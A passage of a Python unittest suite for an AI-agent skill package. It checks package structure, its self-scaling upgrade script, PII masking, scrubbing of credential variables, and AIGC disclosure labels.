        §7.3 requires every def to appear exactly once package-wide. This check used to rely on a manual grep,
        which let README-FOR-AI.md §7.1 inline-copy mask_sensitive_data unnoticed.
        Two lines of defence coexist: the authoritative source contains the 10 defs (test_templates_source_exists),
        and this only-once assertion — only the latter guards the single authoritative source.
        """
        # Scan the PACKAGE FILE SET, never the whole working tree. Repository
        # tooling directories (.workbuddy/, .github/, .skill-upgrade/) hold local
        # copies of the package — review reports, upgrade packages, scratch
        # copies — and are not package content (README-FOR-AI.md §3). An rglob
        # over everything made this assertion fail as soon as a maintainer ran
        # the repository's own review scripts, which write under .workbuddy/.
        hits = {}
        for rel in package_relative_paths():
            if not rel.endswith((".md", ".py", ".ps1")):
                continue
            path = SKILL_DIR / rel
            try:
                text = path.read_text(encoding="utf-8")
            except (UnicodeDecodeError, OSError):
                continue
            for match in re.finditer(r"^def ([A-Za-z_][A-Za-z0-9_]*)", text, re.M):
                hits.setdefault(match.group(1), set()).add(rel)

        duplicated = {name: sorted(locs) for name, locs in hits.items() if len(locs) > 1}
        self.assertEqual(
            {}, duplicated,
            "template code was inlined in multiple places (P10/P44): " +
            "; ".join(f"{name} -> {locs}" for name, locs in sorted(duplicated.items()))
        )

        # The authoritative source must cover all 10 templates, and none may land outside it.
        authoritative = AUTHORITATIVE_SOURCE
        outside = {
            name: sorted(locs)
            for name, locs in hits.items()
            if name in TEN_TEMPLATE_NAMES and locs != {authoritative}
        }
        self.assertEqual(
            {}, outside,
            f"template functions must appear only in {authoritative} (P10/P44): {outside}"
        )


# ═════════════════════════════════════════════════════════════════════════════
# C. Structural consistency tests
# ═════════════════════════════════════════════════════════════════════════════
class StructureTests(unittest.TestCase):
    """micro-tier structural invariants: function-block conservation, the four scaling files, governance files, prompt constraints."""

    def test_function_block_conservation(self):
        """Assert total function-block conservation: micro/small/medium/large=18, group=36"""
        dept_dir = SKILL_DIR / "references" / "departments"
        self.assertTrue(dept_dir.exists(), f"department directory missing: {dept_dir}")
        actual = {}
        total = 0
        for f in sorted(dept_dir.glob("*.md")):
            content = f.read_text(encoding="utf-8")
            n = len(FB_HEADING_RE.findall(content))
            actual[f.name] = n
            total += n
        self.assertEqual(
            total, EXPECTED_FB_TOTAL,
            f"the {SCALE_TIER} tier must have {EXPECTED_FB_TOTAL} function blocks, found {total} (a merged tier dropped functions)",
        )
        self.assertEqual(
            actual, EXPECTED_DEPARTMENT_BLOCKS,
            f"per-department function blocks do not match the {SCALE_TIER} tier spec: {actual}",
        )

    def test_scaling_files_present(self):
        """Assert the four self-scaling files are present and the policy is propose-only"""
        for p in ["references/scaling.md", ".scaling-state.json",
                  "scripts/self-scale.ps1", "scripts/scaling-config.json"]:
            self.assertTrue((SKILL_DIR / p).exists(), f"scaling mechanism file missing: {p}")
        cfg = json.loads(
            (SKILL_DIR / "scripts" / "scaling-config.json").read_text(encoding="utf-8")
        )
        self.assertEqual(cfg.get("upgrade_policy"), "propose-only",
                         "upgrade_policy can only be propose-only (P36)")

    def test_governance_files_present(self):
        """★ R3-7 (12 to 13): assert all 13 governance and community files exist at every tier, with exact filename case"""
        actual_names = {f.name for f in SKILL_DIR.iterdir()}
        for name in GOVERNANCE_FILES:
            p = SKILL_DIR / name
            self.assertTrue(p.exists(), f"governance file missing: {name}")
            self.assertTrue(p.is_file(), f"governance file is not a regular file: {name}")
            self.assertIn(name, actual_names,
                          f"filename case must match the spec exactly: {name}")

    def test_no_filename_with_space(self):
        """★ R3-7: assert no filename contains a space (guards against 'CODE OF CONDUCT.md')"""
        # Same package-file-set basis as test_def_unique_across_package: a
        # scratch copy under .workbuddy/ is not package content (§3).
        for rel in package_relative_paths():
            self.assertNotIn(" ", Path(rel).name, f"filename contains a space: {rel}")

    def test_prompt_modes_declared(self):
        """★ R3-3: assert every prompt declares mode, and 01/02 are human-paste"""
        prompts = sorted((SKILL_DIR / "prompts").glob("*.md"))
        self.assertTrue(prompts, "prompts/ is empty or the directory is missing")
        for f in prompts:
            head = f.read_text(encoding="utf-8")[:400]
            self.assertRegex(head, r"mode:\s*(human-paste|agent-invoked)",
                             f"{f.name} does not declare mode")
        for n in ["01-implement-method.md", "02-robustness-checks.md"]:
            head = (SKILL_DIR / "prompts" / n).read_text(encoding="utf-8")[:400]
            self.assertIn("mode: human-paste", head, f"{n} must be human-paste")

    def test_human_paste_prompts_self_contained(self):
        """★ R3-3: assert a human-paste prompt contains no internal paths and no hardwired language (H1/H2/H6)"""
        for f in (SKILL_DIR / "prompts").glob("*.md"):
            content = f.read_text(encoding="utf-8")
            if "mode: human-paste" not in content[:400]:
                continue
            # H1 forbids internal paths (references/ prompts/ scripts/ {SKILL_DIR} SKILL.md
            # method-patterns); H2 forbids internal identifiers (department slugs, error codes, FB-N, WFT-NNN);
            # H6 forbids a hardwired output language. The old list checked only 4 items, so copying method-patterns
            # or an error code into a prompt would still pass.
            for bad in [
                "references/", "prompts/", "scripts/", "{SKILL_DIR}",
                "SKILL.md", "method-patterns",
                "governance-and-delivery", "engineering-and-safety",
                "CEO_", "CTO_", "SCL_", "FB-", "WFT-",
                "All content in English",
            ]:
                self.assertNotIn(bad, content, f"{f.name} violates the self-containment constraint: {bad}")

            # H3: self-containment also requires inline background — the 10 template signatures, the 3 PII placeholders
            # and the three AIGC labelling elements must all be carried. The old assertion checked only what must not
            # appear, never what must appear, so prompt 02 could pass with only robustness dimensions and no signature list.
            for sig in TEN_TEMPLATE_SIGNATURES:
                self.assertIn(sig, content, f"{f.name} is missing the H3 inline signature: {sig}")
            for ph in ("[EMAIL]", "[IP]", "[PHONE]"):
                self.assertIn(ph, content, f"{f.name} is missing the H3 PII placeholder: {ph}")
            for layer in ("AI-Generated Content", "ai_generated", "generated_at"):
                self.assertIn(layer, content, f"{f.name} is missing the H3 AIGC element: {layer}")

    def test_language_policy_declared(self):
        """★ R3-4: assert the frontmatter carries language_policy with the correct values (four fields)"""
        skill_md = SKILL_DIR / "SKILL.md"
        self.assertTrue(skill_md.exists(), "SKILL.md missing")
        fm = parse_frontmatter(skill_md)
        lp = fm.get("language_policy")
        self.assertIsInstance(lp, dict, "the frontmatter is missing the language_policy block")
        self.assertEqual(str(lp.get("authoring")), "en")
        self.assertEqual(str(lp.get("encoding")), "utf-8")
        self.assertEqual(str(lp.get("output")), "user-specified")
        self.assertEqual(str(lp.get("fallback")), "en")

    def test_skill_md_is_index_only(self):
        """★ R3-1: assert the SKILL.md body is <= 120 lines, with no code implementation and no full error-code table"""
        skill_md = SKILL_DIR / "SKILL.md"
        self.assertTrue(skill_md.exists(), "SKILL.md missing")
        text = skill_md.read_text(encoding="utf-8")
        parts = text.split("---", 2)
        self.assertGreaterEqual(len(parts), 3, "SKILL.md is missing its frontmatter")
        body = parts[2]
        self.assertLessEqual(len(body.splitlines()), 120, "the SKILL.md body exceeds 120 lines")
        self.assertFalse(re.search(r"(?m)^def ", body),
                         "SKILL.md must not contain a code implementation")
        self.assertFalse(re.search(r"\| *[A-Z]{2,5}_\d{3}", body),
                         "SKILL.md must not contain a concrete error-code table")

    def test_metadata_consistency(self):
        """Assert frontmatter metadata matches the micro-tier parameters (version 1.0.0, tier, department count, block count)"""
        skill_md = SKILL_DIR / "SKILL.md"
        self.assertTrue(skill_md.exists(), "SKILL.md missing")
        fm = parse_frontmatter(skill_md)
        self.assertEqual(str(fm.get("version")), SKILL_VERSION,
                         f"the version should be {SKILL_VERSION}")
        metadata = fm.get("metadata")
        self.assertIsInstance(metadata, dict, "the frontmatter is missing the metadata block")
        self.assertEqual(str(metadata.get("scale_tier")), SCALE_TIER)
        self.assertEqual(str(metadata.get("department_count")),
                         str(len(EXPECTED_DEPARTMENT_BLOCKS)))
        self.assertEqual(str(metadata.get("function_block_count")),
                         str(EXPECTED_FB_TOTAL))


# ═════════════════════════════════════════════════════════════════════════════
# D. Immutable-boundary tests (the key to upgrade safety)
# ═════════════════════════════════════════════════════════════════════════════
class ImmutableBoundaryTests(unittest.TestCase):
    """An upgrade package must not self-exempt (change tests/) or self-escalate (change permissions)."""

    def test_upgrade_package_excludes_immutable(self):
        """Scan every proposal package under {WORKSPACE_ROOT}/.skill-upgrade/ and
        assert its tests/ is byte-identical to the current skill (no self-exemption)
        and its permissions block is unchanged (no self-escalation). A proposal
        package legitimately *carries* tests/ verbatim (gate G2 re-hashes it); it must
        not *change* them relative to the skill it was built from."""
        upgrade_root = WORKSPACE_ROOT / ".skill-upgrade"
        if not upgrade_root.exists():
            self.skipTest(f"no upgrade proposal package yet ({upgrade_root} does not exist)")
        packages = [p for p in sorted(upgrade_root.iterdir()) if p.is_dir()]
        if not packages:
            self.skipTest("no proposal package directory under .skill-upgrade/")
        skill_tests = SKILL_DIR / "tests"
        for pkg in packages:
            pkg_tests = pkg / "tests"
            if pkg_tests.is_dir() and skill_tests.is_dir():
                for f in sorted(pkg_tests.rglob("*")):
                    if not f.is_file():
                        continue
                    rel = f.relative_to(pkg_tests).as_posix()
                    src = skill_tests / rel
                    self.assertTrue(
                        src.exists(),
                        f"the upgrade package carries a tests file absent from the skill "
                        f"(potential self-exemption): {pkg}/{rel}",
                    )
                    self.assertEqual(
                        f.read_bytes(), src.read_bytes(),
                        f"the upgrade package modifies tests (self-exemption): {pkg}/{rel}",
                    )
            skill_md = pkg / "SKILL.md"
            if skill_md.exists():
                new_perm = extract_permissions_block(skill_md)
                self.assertEqual(
                    new_perm, BASELINE_PERMISSIONS,
                    f"the upgrade package tries to modify permissions (self-escalation): {pkg}",
                )


# ═════════════════════════════════════════════════════════════════════════════
# ★ 2026-10-14 initial-review regression line (H-1..H-4 / M-1..M-4)
#
# Lesson from the initial review: 31 assertions all green, 13 governance files present, every red line ticked,
# yet the mechanism was broken. These assertions therefore test only whether the mechanism actually runs, not wording.
# Each was negative-verified: after writing the defect back into a throwaway copy, the assertion must fail.
# ═════════════════════════════════════════════════════════════════════════════
class InitialReview20261014Tests(unittest.TestCase):
    """Machine guard for the high/medium defects found in the initial review."""

    def _run_self_scale(self, script, action, extra=None, timeout=180):
        """Run self-scale.ps1 in a subprocess and return the CompletedProcess."""
        exe = shutil.which("powershell") or shutil.which("pwsh")
        if exe is None:
            self.skipTest("no powershell/pwsh found; skipping the script smoke assertion")
        cmd = [exe, "-ExecutionPolicy", "Bypass", "-File", str(script), "-Action", action]
        if extra:
            cmd.extend(extra)
        return subprocess.run(
            cmd, capture_output=True, text=True, encoding="utf-8",
            errors="replace", timeout=timeout,
        )

    def _temp_workspace(self):
        """Create a writable workspace directory.

        Not tempfile.TemporaryDirectory(): the 0700 directory it creates makes this host's sandbox
        refuse subdirectories/cleanup inside it (WinError 5). Instead a unique directory is created
        under the system temp dir, falling back to .workbuddy/ (already excluded from the package file set).
        """
        base = Path(tempfile.gettempdir())
        for _ in range(20):
            candidate = base / ("aic-selftest-" + uuid.uuid4().hex[:10])
            try:
                candidate.mkdir()
                return candidate
            except FileExistsError:
                continue
            except PermissionError:
                break
        fallback = SKILL_DIR / ".workbuddy" / "selftest" / uuid.uuid4().hex[:10]
        fallback.mkdir(parents=True, exist_ok=True)
        return fallback

    def _clean_copy(self, dest):
        """Copy the package file set into dest (inside a temp workspace), preserving the relative structure."""
        dest = Path(dest)
        for rel in package_relative_paths():
            target = dest / rel
            target.parent.mkdir(parents=True, exist_ok=True)
            shutil.copy2(SKILL_DIR / rel, target)
        return dest

    # ── H-1 / H-3: the package file set must match the three-sibling structure tree path by path ──
    def test_package_file_set_matches_declared_count(self):
        """★ H-1/H-3: the package file set = 30 (small tier) and the three README siblings' trees match it path by path."""
        declared = set(package_relative_paths())
        self.assertEqual(
            30, len(declared),
            f"the package file set should be 30, found {len(declared)}: {sorted(declared)}",
        )
        for doc in ("README.md", "README.en.md", "README.zh.md"):
            tree = set(readme_tree_paths(doc))
            self.assertEqual(
                declared, tree,
                f"{doc} structure tree does not match the package file set: "
                f"on disk but not in the tree={sorted(declared - tree)}, "
                f"in the tree but not on disk={sorted(tree - declared)}",
            )
        blocks = []
        for doc in ("README.md", "README.en.md", "README.zh.md"):
            text = (SKILL_DIR / doc).read_text(encoding="utf-8")
            blocks.append(re.search(r"```text\n(.*?)```", text, re.S).group(1))
        self.assertEqual(blocks[0], blocks[1], "README.en.md and README.md trees differ")
        self.assertEqual(blocks[0], blocks[2], "README.zh.md and README.md trees differ")

    # ── H-1: the upgrade package must not carry repository tooling directories ────────────────────
    def test_upgrade_package_excludes_repo_tooling(self):
        """★ H-1: .git//.workbuddy//.github/ never enter the upgrade package (skip when no package exists)."""
        upgrade_root = WORKSPACE_ROOT / ".skill-upgrade"
        if not upgrade_root.exists():
            self.skipTest(f"no upgrade proposal package yet ({upgrade_root} does not exist)")
        packages = [
            p for p in sorted(upgrade_root.rglob("*"))
            if p.is_dir() and (p / "SKILL.md").exists()
        ]
        if not packages:
            self.skipTest("no proposal package directory under .skill-upgrade/")
        for pkg in packages:
            leaks = []
            for f in pkg.rglob("*"):
                if not f.is_file():
                    continue
                rel = f.relative_to(pkg).as_posix()
                if rel.split("/")[0] in PACKAGE_EXCLUDED_DIRS:
                    leaks.append(rel)
            self.assertEqual(
                [], leaks,
                f"the upgrade package carries non-package content (H-1 release leak): {pkg}: {leaks[:5]}",
            )

    # ── H-1 / H-4: this end-to-end line catches every propose defect at once ─────────────────────
    def test_propose_smoke_on_clean_copy(self):
        """★ H-1/H-4: a clean-copy propose must exit 0 with G1-G6 all PASSED.

        Only the micro->small edge is implemented in this build (scaling.md 2.1),
        so the smoke is meaningful only at the micro tier; skip otherwise.
        """
        if SCALE_TIER != "micro":
            self.skipTest(
                f"propose smoke is only meaningful at the micro tier "
                f"(this build implements only micro->small); current tier={SCALE_TIER}"
            )
        workspace = self._temp_workspace()
        self.addCleanup(shutil.rmtree, workspace, ignore_errors=True)
        pkg = self._clean_copy(workspace / "ai-company")
        proc = self._run_self_scale(pkg / "scripts" / "self-scale.ps1", "propose")
        combined = (proc.stdout or "") + "\n" + (proc.stderr or "")
        self.assertEqual(
            0, proc.returncode,
            f"clean-copy propose should exit 0, got {proc.returncode}:\n{combined[-3000:]}",
        )
        for gate in ("G1", "G2", "G3", "G4", "G5", "G6"):
            self.assertIn(f"{gate} PASSED", combined,
                          f"{gate} did not pass:\n{combined[-3000:]}")
        proposals = list((workspace / ".skill-upgrade").rglob("UPGRADE-PROPOSAL.md"))
        self.assertEqual(1, len(proposals), "no UPGRADE-PROPOSAL.md was generated")

        # Recheck B1/H-5: a split page must take its own display name and its own block count.
        # The old $preamble.Replace($src, $t.Slug) was a no-op (the preamble carries the display name,
        # not the slug), so all five split pages kept the legacy title and the 8/10 count, while G4 counted
        # only '## FB-N:' headings and still PASSED.
        pkg_dir = proposals[0].parent
        expected = {
            "governance-and-operations": ("Governance and Operations", 6),
            "quality-and-delivery": ("Quality and Delivery", 2),
            "technology-and-platform": ("Technology and Platform", 3),
            "security-and-compliance": ("Security and Compliance", 3),
            "people-and-growth": ("People and Growth", 4),
        }
        actual_slugs = set()
        for f in sorted((pkg_dir / "references" / "departments").glob("*.md")):
            actual_slugs.add(f.stem)
            self.assertIn(f.stem, expected, f"generated an extra department page: {f.name}")
            title, blocks = expected[f.stem]
            head = f.read_text(encoding="utf-8").splitlines()
            self.assertEqual(
                f"# {title}", head[0].strip(),
                f"{f.name} did not take its own department title (legacy title retained)",
            )
            self.assertIn(
                f"Function blocks: {blocks}.", head[2],
                f"{f.name}'s Function blocks declaration was not rewritten with the split (§10.2 conservation basis)",
            )
        self.assertEqual(
            set(expected), actual_slugs,
            f"the split-page set is incomplete: {sorted(set(expected) - actual_slugs)}",
        )
        tree = (pkg_dir / "README.md").read_text(encoding="utf-8")
        self.assertIn(
            "```text\nai-company/", tree,
            "the generated README structure tree root is not the package name ai-company/",
        )

    # ── M-2: the top-level validation block (fields required by §12.6) ───────────────────────────
    def test_scaling_state_schema_complete(self):
        """★ M-2: the state file has every required top-level field, validation.gates_passed == 6."""
        state = json.loads((SKILL_DIR / ".scaling-state.json").read_text(encoding="utf-8"))
        required = {
            "schema_version", "current_tier", "tier_history", "pending_proposals",
            "next_evaluation", "last_metrics", "routing_miss_streak",
            "metrics_provenance", "validation",
        }
        self.assertTrue(
            required <= set(state),
            f"the state file is missing fields: {sorted(required - set(state))}",
        )
        validation = state["validation"]
        self.assertEqual(6, validation.get("gates_passed"),
                         "validation.gates_passed must = 6")
        self.assertEqual(30, validation.get("file_count"),
                         "small-tier validation.file_count should be 30")
        self.assertIn("acceptance_passed", validation)

    # ── M-1: must read bytes; read_text() hides CRLF ─────────────────────────────────────────────
    def test_no_crlf_and_no_bom_package_wide(self):
        """★ M-1: no CRLF and no BOM package-wide (raw bytes; universal newlines cannot see CRLF)."""
        offenders_crlf, offenders_bom = [], []
        for rel in package_relative_paths():
            raw = (SKILL_DIR / rel).read_bytes()
            if b"\xef\xbb\xbf" in raw[:3]:
                offenders_bom.append(rel)
            if b"\r\n" in raw:
                offenders_crlf.append(rel)
        self.assertEqual([], offenders_crlf, f"these files contain CRLF (must be LF): {offenders_crlf}")
        self.assertEqual([], offenders_bom, f"these files start with a BOM: {offenders_bom}")

    # ── M-4: section references must actually exist ──────────────────────────────────────────────
    def test_doc_section_anchors_exist(self):
        """★ M-4: every section reference in scaling.md / README-FOR-AI.md must exist."""
        targets = {
            "scaling.md": markdown_sections("references/scaling.md"),
            "README-FOR-AI.md": markdown_sections("README-FOR-AI.md"),
        }
        scanned = [
            "scripts/self-scale.ps1", "references/scaling.md",
            "references/method-patterns.md", "SKILL.md", "AGENTS.md",
            "CONTRIBUTING.md", "README.md", "README-FOR-AI.md",
        ]
        ref_re = re.compile(
            r"(scaling\.md|README-FOR-AI\.md)[^\n]{0,60}?(?:§|sec(?:tion)?\.?)\s*(\d+(?:\.\d+)*)",
            re.I,
        )
        missing = []
        for rel in scanned:
            text = (SKILL_DIR / rel).read_text(encoding="utf-8")
            for m in ref_re.finditer(text):
                doc, section = m.group(1), m.group(2)
                if section not in targets[doc]:
                    missing.append(f"{rel} -> {doc} §{section}")
        self.assertEqual([], missing, f"references point at non-existent sections (P8/P19): {missing}")

    # ── H-2a: every ValidateSet value must have a switch branch ──────────────────────────────────
    def test_record_metrics_action_implemented(self):
        """★ H-2a: an action declared but with no branch must not exist; the switch must have a default."""
        text = (SKILL_DIR / "scripts" / "self-scale.ps1").read_text(encoding="utf-8")
        vs = re.search(r"\[ValidateSet\(([^)]*)\)\]", text)
        self.assertIsNotNone(vs, "no ValidateSet found")
        actions = [a.strip().strip("'\"") for a in vs.group(1).split(",") if a.strip()]
        self.assertTrue(actions, "the ValidateSet is empty")
        for action in actions:
            self.assertRegex(
                text, r"'" + re.escape(action) + r"'\s*\{",
                f"ValidateSet declares '{action}', but the switch has no branch for it (H-2 no-op)",
            )
        self.assertRegex(
            text, r"default\s*\{\s*Stop-WithCode",
            "the switch is missing a default branch: an action declared but unimplemented would silently no-op again",
        )

    # ── H-2c / H-2d: fresh host metrics must really take part in T1 ──────────────────────────────
    def test_host_metric_freshness_uses_config(self):
        """★ H-2c/H-2d: after injecting a fresh over-threshold metric, T1 must fire and freshness is no longer empty."""
        workspace = self._temp_workspace()
        self.addCleanup(shutil.rmtree, workspace, ignore_errors=True)
        pkg = self._clean_copy(workspace / "ai-company")
        script = pkg / "scripts" / "self-scale.ps1"
        rec = self._run_self_scale(
            script, "record-metrics", ["-AgentCount", "15", "-Source", "selftest"],
        )
        rec_out = (rec.stdout or "") + (rec.stderr or "")
        self.assertEqual(0, rec.returncode, f"record-metrics failed:\n{rec_out[-2000:]}")
        ev = self._run_self_scale(script, "evaluate")
        combined = (ev.stdout or "") + "\n" + (ev.stderr or "")
        self.assertIn(
            "T1 agent capacity: agent_count = 15, threshold >", combined,
            f"a fresh host metric did not take part in T1 per the config:\n{combined[-2500:]}",
        )
        self.assertIn("TRIGGERED T1", combined,
                      f"T1 did not fire (H-2 recurrence):\n{combined[-2500:]}")
        self.assertNotIn(
            "-day freshness limit", combined,
            "the freshness log degraded to empty (Get-CurrentMetrics was not passed -Config)",
        )


# ═════════════════════════════════════════════════════════════════════════════
# ★ 2026-10-14 recheck (second round) regression line
#
# The initial review's 39 assertions were all green and the mechanism was still broken in three places:
# a second host-metric write corrupted the store, T3 ignored min_routing_samples/freshness, and the split pages
# kept the legacy title and count. Every assertion this round was first negative-verified per CONTRIBUTING.md.
# ═════════════════════════════════════════════════════════════════════════════
class Recheck20261014Tests(unittest.TestCase):
    """Machine guard for the defects found in the recheck round (2026-10-14 R2)."""

    @classmethod
    def setUpClass(cls):
        os.environ.setdefault("SKILL_DIR", str(SKILL_DIR))
        os.environ.setdefault("WORKSPACE_ROOT", str(WORKSPACE_ROOT))
        cls.ns = load_template_namespace()

    def _fn(self, name):
        fn = self.ns.get(name)
        self.assertTrue(callable(fn), f"template {name} is not callable")
        return fn

    def _run_self_scale(self, script, action, extra=None, timeout=180):
        exe = shutil.which("powershell") or shutil.which("pwsh")
        if exe is None:
            self.skipTest("no powershell/pwsh found; skipping the script smoke assertion")
        cmd = [exe, "-ExecutionPolicy", "Bypass", "-File", str(script), "-Action", action]
        if extra:
            cmd.extend(extra)
        return subprocess.run(
            cmd, capture_output=True, text=True, encoding="utf-8",
            errors="replace", timeout=timeout,
        )

    def _temp_workspace(self):
        base = Path(tempfile.gettempdir())
        for _ in range(20):
            candidate = base / ("aic-recheck-" + uuid.uuid4().hex[:10])
            try:
                candidate.mkdir()
                return candidate
            except FileExistsError:
                continue
            except PermissionError:
                break
        fallback = SKILL_DIR / ".workbuddy" / "selftest" / uuid.uuid4().hex[:10]
        fallback.mkdir(parents=True, exist_ok=True)
        return fallback

    def _clean_copy(self, dest):
        dest = Path(dest)
        for rel in package_relative_paths():
            target = dest / rel
            target.parent.mkdir(parents=True, exist_ok=True)
            shutil.copy2(SKILL_DIR / rel, target)
        return dest

    # ── Recheck B1: a second host-metric write must not corrupt host_metrics ──────────────────────
    def test_host_metrics_survive_multiple_writes(self):
        """★ Recheck B1: after one call writes two host metrics, T1 must still be able to read them.

        Previously Write-HostMetric copied the existing [ordered] dictionary with PSObject.Properties,
        which copies the .NET members (Count/Keys/Values/...) rather than the metric entries, so the
        second write in one process turned host_metrics into garbage; T1/T3 then reported
        "never supplied by any host", silently disabling the host-supplied metrics — a drop directory
        carrying two files (the documented usage) was enough to trigger it.
        """
        workspace = self._temp_workspace()
        self.addCleanup(shutil.rmtree, workspace, ignore_errors=True)
        pkg = self._clean_copy(workspace / "ai-company")
        script = pkg / "scripts" / "self-scale.ps1"
        rec = self._run_self_scale(
            script, "record-metrics",
            ["-AgentCount", "9", "-RoutingAccuracy", "0.5", "-SampleSize", "100"],
        )
        self.assertEqual(
            0, rec.returncode,
            f"record-metrics failed:\n{(rec.stdout or '')[-1500:]}",
        )
        state = json.loads((pkg / ".scaling-state.json").read_text(encoding="utf-8"))
        host = state.get("host_metrics", {})
        self.assertEqual(
            {"agent_count", "routing_accuracy"}, set(host),
            f"host_metrics was corrupted (entries lost/replaced by .NET members after a second write): {host}",
        )
        self.assertEqual(9, host["agent_count"].get("value"), "the agent_count entry was corrupted")
        self.assertEqual(0.5, host["routing_accuracy"].get("value"),
                         "the routing_accuracy entry was corrupted")
        ev = self._run_self_scale(script, "evaluate")
        combined = (ev.stdout or "") + "\n" + (ev.stderr or "")
        self.assertIn("T1 agent capacity: agent_count = 9", combined,
                      f"host metrics were not read:\n{combined[-1500:]}")
        self.assertNotIn("never supplied by any host", combined,
                         "metrics written by the host were judged never supplied (host_metrics corruption recurrence)")

    # ── Recheck B2: T3 must honour min_routing_samples / freshness ────────────────────────────────
    def test_t3_skips_when_samples_below_minimum(self):
        """★ Recheck B2: below min_routing_samples, T3 must skip and must not count.

        Contract (references/scaling.md §3.1): with too few samples or a stale observation, T3 skips,
        never guess. The verdict used to be consumed only by T1, while T3 read the mirrored value and
        advanced the miss counter, so five samples over three runs could generate an upgrade proposal.
        """
        workspace = self._temp_workspace()
        self.addCleanup(shutil.rmtree, workspace, ignore_errors=True)
        pkg = self._clean_copy(workspace / "ai-company")
        script = pkg / "scripts" / "self-scale.ps1"
        rec = self._run_self_scale(
            script, "record-metrics", ["-RoutingAccuracy", "0.5", "-SampleSize", "5"],
        )
        self.assertEqual(
            0, rec.returncode,
            f"record-metrics failed:\n{(rec.stdout or '')[-1500:]}",
        )
        for _ in range(4):
            ev = self._run_self_scale(script, "evaluate")
            combined = (ev.stdout or "") + "\n" + (ev.stderr or "")
            self.assertNotIn("TRIGGERED T3", combined,
                             f"routing data below the sample minimum triggered an upgrade proposal:\n{combined[-1500:]}")
            self.assertIn("T3 SKIPPED", combined,
                          f"T3 did not skip per min_routing_samples:\n{combined[-1500:]}")
        state = json.loads((pkg / ".scaling-state.json").read_text(encoding="utf-8"))
        self.assertEqual(0, state.get("routing_miss_streak"),
                         "an unusable routing sample advanced routing_miss_streak")

    # ── Recheck B3: version/release/build must not exempt an IPv4 from masking ───────────────────
    def test_ip_masking_has_no_version_keyword_escape(self):
        """★ Recheck B3: a real IPv4 after a keyword must still be masked (§9.3 mandatory)."""
        mask = self._fn("mask_sensitive_data")
        cases = {
            "release 192.168.1.100": "release [IP]",
            "build 10.0.0.1": "build [IP]",
            "rev 8.8.4.4": "rev [IP]",
            "v 10.0.0.1": "v [IP]",
        }
        for raw, expected in cases.items():
            self.assertEqual(
                expected, mask(raw),
                f"{raw!r} was not masked (version-keyword exemption recurrence)",
            )

    # ── Recheck B4: credential scrubbing must really remove variables without wiping benign ones ──
    def test_credential_scrubbing_removes_real_names(self):
        """★ Recheck B4: _scrubbed_environment really removes credentials and keeps PATH/HOME."""
        scrub = self._fn("_scrubbed_environment")
        # _scrubbed_environment() reads os.environ itself (zero-argument contract),
        # so inject the names, call it, and always restore.
        injected = {
            "AWS_SECRET_ACCESS_KEY": "x",
            "GITHUB_TOKEN": "x",
            "OPENAI_APIKEY": "x",
            "PATH": "/usr/bin",
            "HOME": "/root",
            "LANG": "C.UTF-8",
            "TERM": "xterm",
        }
        saved = {k: os.environ.get(k) for k in injected}
        os.environ.update(injected)
        try:
            out = scrub()
        finally:
            for k, v in saved.items():
                if v is None:
                    os.environ.pop(k, None)
                else:
                    os.environ[k] = v
        for secret in ("AWS_SECRET_ACCESS_KEY", "GITHUB_TOKEN", "OPENAI_APIKEY"):
            self.assertNotIn(secret, out, f"credential variable was not removed from the child environment: {secret}")
        for benign in ("PATH", "HOME", "LANG", "TERM"):
            self.assertIn(benign, out, f"benign variable was wrongly removed: {benign}")

    # ── Recheck B5: the three AIGC labelling layers (including the digest-bound embedded disclosure) ──
    def test_format_output_json_aigc_three_layers(self):
        """★ Recheck B5: assert the three layers one by one; the disclosure marker must be bound to the content digest."""
        fmt = self._fn("format_output_json")
        out = fmt("body one", "openai/gpt-4")
        data = json.loads(out)
        self.assertIs(data.get("ai_generated"), True, "layer 2 is missing ai_generated: true")
        self.assertIn("generated_at", data, "layer 2 is missing generated_at (it could previously be silently dropped)")
        self.assertRegex(
            data["generated_at"], r"\d{4}-\d{2}-\d{2}T\d{2}:\d{2}",
            "generated_at is not ISO8601",
        )
        self.assertEqual("openai/gpt-4", data.get("model"),
                         "the model field is not emitted as <provider/model>")
        first = re.search(r"\[aigc:[0-9a-f]+\]", data["content"])
        self.assertIsNotNone(first, "layer 3 is missing the in-body disclosure marker [aigc:...]")
        second = re.search(r"\[aigc:[0-9a-f]+\]",
                           json.loads(fmt("body two", "openai/gpt-4"))["content"])
        self.assertIsNotNone(second)
        self.assertNotEqual(first.group(0), second.group(0),
                            "the disclosure marker is not bound to the content digest (editing the body does not invalidate it)")


# ═════════════════════════════════════════════════════════════════════════════
# ★ 2026-10-16 terminal review (R5) coverage group
#
# The R5 terminal review confirmed the upgrade mechanism itself is healthy
# (clean-copy propose = G1-G6 PASSED and exit 0; T1 fires end to end; the three
# sampled regression guards still fail on the injected defect). It also found
# that several invariants README-FOR-AI.md section 6.1 / section 15 lists as
# acceptance checks had NO assertion: the frontmatter, description, tag and
# trigger budgets; the byte-exact permissions block; error-code catalog
# integrity (34 codes, continuous numbering, D2 tables identical to the
# catalog); the three version locations; the AGENTS.md budget; and the
# no-bare-fence rule. A documented invariant with no machine check is exactly
# the "all green but broken" class this project has been bitten by, so each one
# is asserted below. Every assertion in this group was negative-verified
# (defect injected -> assertion fails) before being kept.
# ═════════════════════════════════════════════════════════════════════════════

_FENCE = chr(96) * 3  # three backticks, built from a code point so this file stays readable
_EC_ROW_RE = re.compile(
    r"^\|\s*((?:CEO|CTO|CISO|CHO|CQO|SCL)_\d{3})\s*\|([^|]*)\|([^|]*)\|([^|]*)\|\s*$", re.M
)

# README-FOR-AI.md section 10.3: the SCL_ messages are fixed across every tier.
_FIXED_SCL_MESSAGES = {
    "SCL_001": "Upgrade threshold not met",
    "SCL_002": "Upgrade path undefined in merge tree",
    "SCL_003": "Alias collision detected",
    "SCL_004": "Permission self-modification attempted",
    "SCL_005": "Test self-modification attempted",
    "SCL_006": "Upgrade package validation failed",
    "SCL_007": "Scaling state file corrupted",
    "SCL_008": "Downgrade requires manual approval",
    "SCL_009": "Tier already at maximum (group)",
    "SCL_010": "Function block conservation violated",
}


def parse_error_code_rows(text):
    """Return {code: (message, trigger, resolution)} for a four-element code table."""
    rows = {}
    for m in _EC_ROW_RE.finditer(text):
        rows[m.group(1)] = tuple(cell.strip() for cell in m.groups()[1:])
    return rows


class TerminalReview20261016Tests(unittest.TestCase):
    """Machine enforcement for README-FOR-AI.md section 6.1 / section 15 invariants."""

    def _frontmatter_lines(self):
        lines = (SKILL_DIR / "SKILL.md").read_text(encoding="utf-8").splitlines()
        self.assertEqual("---", lines[0].strip(), "SKILL.md does not start with frontmatter")
